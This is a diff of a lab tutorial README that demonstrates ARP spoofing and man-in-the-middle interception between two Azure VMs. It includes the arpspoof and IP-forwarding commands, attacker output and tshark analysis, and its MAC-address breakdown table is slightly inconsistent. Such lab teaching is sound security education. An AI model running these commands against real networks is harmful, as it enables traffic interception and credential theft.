@@ -1,6 +1,6 @@
 # 🛠️ Part 2: Simulating Attacks and Analyzing Traffic
 
-This section explains how to use the infrastructure created in [Part 1: Building the Cyber Lab Environment](README_PART1.md) to demonstrate several real-world cyberattacks in a controlled Azure environment, showcasing both offensive techniques (from a Kali Linux virtual machine) and monitoring/detection (on an Ubuntu VM using tools like Zeek, tcpdump and tshark). **These exercises are designed for educational purposes only.**
+This second part of the project uses the infrastructure created in [Part 1: Building the Cyber Lab Environment](README_PART1.md) to demonstrate several real-world cyberattacks in a controlled Azure environment, showcasing both offensive techniques (from a Kali Linux virtual machine) and monitoring/detection (on an Ubuntu VM using tools like Zeek, tcpdump and tshark). **These exercises are designed for educational purposes only.**
 
 ---
 
@@ -51,7 +51,6 @@ To connect to a VM, open a terminal on your local computer and use the following
 
 ```
 ssh -i path/to/key.pem azureuser@20.169.229.158
-
 ```
 - Replace  `path/to/key.pem ` with the path to your private key file.
 
@@ -120,36 +119,34 @@ It´s purpose is to establish a reliable connection between a client and a serve
 💡 If any of these steps fail, the connection does not fully establish. This behavior is what scanners like nmap exploit to detect open, closed, or filtered ports.
 
 ##
-### 🕵️ 1. ARP Spoofing / Man-in-the-Middle (MITM) using Arspoof
+### 🕵️ 1. ARP Spoofing / Man-in-the-Middle (MITM) using Arpspoof
 ##
 
 #### What is ARP?
- **ARP (Address Resolution Protocol)** is communication protocol used in local networks to map **IP addresses** (like 10.0.0.4) to **MAC addresses** (**unique** hardware addresses like 00:1A:2B:3C:4D:5E assigned to network interfaces). This is essential for communication within a local network. It acts as a translator between the logical IP addresses used for routing and the physical MAC addresses used by network hardware. 
+ **ARP (Address Resolution Protocol)** is a communication protocol used in local networks to map **IP addresses** (like 10.0.0.4) to **MAC addresses** (**unique** hardware addresses like 00:1A:2B:3C:4D:5E assigned to network interfaces). This is essential for communication within a local network. ARP acts as a translator between the logical IP addresses used for routing and the physical MAC addresses used by network hardware. 
 
  **Important characteristics:**
 
 - Devices maintain an ARP table to keep track of these mappings.
 
 - Usually, devices use ARP to contact the router or gateway that enables them to connect to the Internet.
-- Unfortunately, ARP is unauthenticated, meaning any device can send fake ARP messages.
+- Unfortunately, ARP is **unauthenticated**, meaning any device can send fake ARP messages.
 
 ##
 
 ####  ARP Spoofing
- In an **ARP spoofing attack**, an attacker tricks a victim (Ubuntu VM), by sending forged ARP messages, into thinking the attacker’s MAC address is the gateway (router) and viceversa. This allows the attacker to:
+ In an **ARP spoofing attack**, an attacker tricks a victim (by sending forged ARP messages) into thinking the attacker’s MAC address is the gateway (router), and viceversa. This allows the attacker to:
 
   - Intercept and be in the middle of all communications **(Man-in-the-Middle)**
 
-  - Modify or drop packets
-
   - Launch further attacks like credential theft
 
-💡 It’s local network based, meaning both machines need to be on the same subnet.
+💡 This kind of attack is local network based, meaning both machines need to be on the same subnet.
 ##
 #### IP Fowarding and ARP Spoofing
-IP forwarding allows the attacker (Kali VM) to act like a router — forwarding traffic from one device to another. **IP forwarding means: “read and pass it along.”**
+IP forwarding allows the attacker (Kali VM) to act like a router — forwarding traffic from one device to another. **IP forwarding essentially means: “read and pass it along.”**
 
-**Why does it matter wirth ARP Spoofing?:**
+**Why does it matter with ARP Spoofing?:**
 
 - When doing ARP spoofing (man-in-the-middle), both the victim and the gateway send their traffic to the attacker's machine, thinking it's the other.
 
@@ -166,7 +163,7 @@ IP forwarding allows the attacker (Kali VM) to act like a router — forwarding 
 
 #### ⚔️ Performing the Attack:
 
-- Run `ip route` on any VM to verify the default gateway:
+- Run `ip route` on any VM to check the ip of the default gateway:
 
 **IP Fowarding:**
 - On a terminal connected to the Kali VM, run the following command:
@@ -194,7 +191,6 @@ IP forwarding allows the attacker (Kali VM) to act like a router — forwarding 
   ```
   sudo arpspoof -i eth0 -t 10.0.1.5 10.0.1.1
   sudo arpspoof -i eth0 -t 10.0.1.1 10.0.1.5
-
   ```
   **What it does:**
 
@@ -223,31 +219,100 @@ IP forwarding allows the attacker (Kali VM) to act like a router — forwarding 
   sudo tcpdump -i eth0
   ```
 
-**On the Victim:**
-- On a terminal connected to the Ubuntu VM, try pinning google.com and the Kali VM, this is to generate ARP traffic, to analyze later:
-
-  ```
-  ping 10.0.1.4 -c 2
-  ```
-  ```
-  ping 8.8.8.8 -c 2
-  ```
-
 
 ##
 ### 📊 Results and Analysis After an ARP Spoofing
+
+**On the Victim:**
+  - On a terminal connected to the Ubuntu VM, try pinning google.com and the Kali VM, this is to generate ARP traffic, to analyze later:
+  
+    ```
+    ping 10.0.1.4 -c 2
+    ```
+    ```
+    ping 8.8.8.8 -c 2
+    ```
+  - We can also use this to verify that the IP Fowarding with Kali is properly working:
+    ```
+    azureuser@ubuntu-vm:~$ ping 10.0.1.4 -c 2
+    PING 10.0.1.4 (10.0.1.4) 56(84) bytes of data.
+    64 bytes from 10.0.1.4: icmp_seq=1 ttl=64 time=1.71 ms
+    64 bytes from 10.0.1.4: icmp_seq=2 ttl=64 time=0.972 ms
+    --- 10.0.1.4 ping statistics ---
+    2 packets transmitted, 2 received, 0% packet loss, time 1002ms
+    rtt min/avg/max/mdev = 0.972/1.340/1.709/0.368 ms
+    
+    azureuser@ubuntu-vm:~$ ping 8.8.8.8 -c 2
+    PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
+    64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=1.93 ms
+    64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=1.84 ms
+    --- 8.8.8.8 ping statistics ---
+    2 packets transmitted, 2 received, 0% packet loss, time 1002ms
+    rtt min/avg/max/mdev = 1.842/1.884/1.926/0.042 ms
+    ```
 - Stop Zeek and tcpdump using Ctrl + C after pinning .
 
 #### Attacker's Perspective:
 
-**Outputs:**
-
-
+  **ARP Spoofing Output:**
+  
+  ```
+  ┌──(azureuser㉿kali)-[~]
+  └─$ sudo arpspoof -i eth0 -t 10.0.1.5 10.0.1.1
+  sudo arpspoof -i eth0 -t 10.0.1.1 10.0.1.5
+  
+  0:d:3a:8f:cc:a8 12:34:56:78:9a:bc 0806 42: arp reply 10.0.1.1 is-at 0:d:3a:8f:cc:a8
+  0:d:3a:8f:cc:a8 12:34:56:78:9a:bc 0806 42: arp reply 10.0.1.1 is-at 0:d:3a:8f:cc:a8
+  0:d:3a:8f:cc:a8 12:34:56:78:9a:bc 0806 42: arp reply 10.0.1.1 is-at 0:d:3a:8f:cc:a8
+  0:d:3a:8f:cc:a8 12:34:56:78:9a:bc 0806 42: arp reply 10.0.1.1 is-at 0:d:3a:8f:cc:a8
+ 
+  ```
+  
+  Let’s break this line down:
+  ```
+  0:d:3a:8f:cc:a8 12:34:56:78:9a:bc 0806 42: arp reply 10.0.1.1 is-at 0:d:3a:8f:cc:a8
+  ```
+  
+  | Part                             | Meaning                                                       |
+  | -------------------------------- | ------------------------------------------------------------- |
+  | `0:d:3a:8f:cc:a8`                | **Source MAC** address (Kali VM’s MAC)                        |
+  | `12:34:56:78:9a:bc`              | Kali´s MAC in disguise (spoofed)                              |
+  | `0806`                           | Ethernet type — **`0x0806` = ARP**                            |
+  | `42`                             | Packet length in bytes                                        |
+  | `arp reply`                      | Type of ARP message                                           |
+  | `10.0.1.1 is-at 0:d:3a:8f:cc:a8` | ARP message content: "`10.0.1.1` is at the (attacker’s) MAC"  |
+  
+  **Kali VM's Real MAC Address**:
+  ```
+  ┌──(azureuser㉿kali)-[~]
+  └─$ ip link show eth0
+  2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP mode DEFAULT group qlen 1000
+      link/ether 00:0d:3a:8f:cc:a8 brd ff:ff:ff:ff:ff:ff
+   ```   
+  
+  This command's output confirms that the MAC address of the Kali VM is `0:d:3a:8f:cc:a8`.
 
 #### Target's Perspective:
-**Output:**
 
-**Logs and Filters:**
+**Analyzing `arp_spoofing.pcap`:**
+ - Using `tshark`, `-Y "arp"` filters packets captured on `arp_spoofing.pcap`. Only showing those that belong to ARP protocol:
+   
+  ```
+  azureuser@ubuntu-vm:~$ tshark -r arp_spoofing.pcap -Y "arp"
+
+  113  16.942700 Microsof_2f:f5:00 → Broadcast    ARP 42 Who has 10.0.1.4? Tell 10.0.1.5
+  114  16.943066 12:34:56:78:9a:bc → Microsof_2f:f5:00 ARP 42 10.0.1.4 is at 12:34:56:78:9a:bc
+  766 100.543456 Microsof_2f:f5:00 → Broadcast    ARP 42 Who has 10.0.1.1? Tell 10.0.1.5
+  767 100.543709 Microsof_2f:f5:00 → Broadcast    ARP 42 Who has 10.0.1.1? Tell 10.0.1.5
+  768 100.544278 12:34:56:78:9a:bc → Microsof_2f:f5:00 ARP 42 10.0.1.1 is at 12:34:56:78:9a:bc
+  769 100.544278 12:34:56:78:9a:bc → Microsof_2f:f5:00 ARP 42 10.0.1.1 is at 12:34:56:78:9a:bc
+  863 113.011002 Microsof_2f:f5:00 → Broadcast    ARP 42 Who has 10.0.1.4? Tell 10.0.1.5
+  865 113.011502 12:34:56:78:9a:bc → Microsof_2f:f5:00 ARP 42 10.0.1.4 is at 12:34:56:78:9a:bc
+ 1229 157.865869 Microsof_2f:f5:00 → 12:34:56:78:9a:bc ARP 42 Who has 10.0.1.4? Tell 10.0.1.5
+ 1230 157.866846 12:34:56:78:9a:bc → Microsof_2f:f5:00 ARP 42 10.0.1.4 is at 12:34:56:78:9a:bc
+ ```
+
+- The PCAP log shows successful ARP spoofing in action. The victim (10.0.1.5) repeatedly broadcasts ARP requests for the IPs 10.0.1.1 (gateway) and 10.0.1.4 (attacker). The attacker responds with forged ARP replies, claiming that 10.0.1.1 is at the attacker’s fake MAC address (12:34:56:78:9a:bc). This poisons the victim’s ARP cache and causes traffic intended for the gateway to be redirected through the attacker — enabling a Man-in-the-Middle attack.
 
 
 ##
